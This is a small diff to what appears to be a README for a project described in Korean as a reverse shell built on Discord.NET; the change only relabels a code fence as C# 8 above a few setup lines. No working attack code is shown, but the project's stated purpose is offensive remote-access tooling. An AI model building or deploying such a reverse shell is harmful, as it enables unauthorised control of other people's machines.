@@ -6,7 +6,7 @@
 
 Discord.NET 을 이용한 reverse shell
 #사용법
-```
+```C# 8
 private static GET GET = new GET();
 // 본 프로그램의 이름
 public string filename = "";
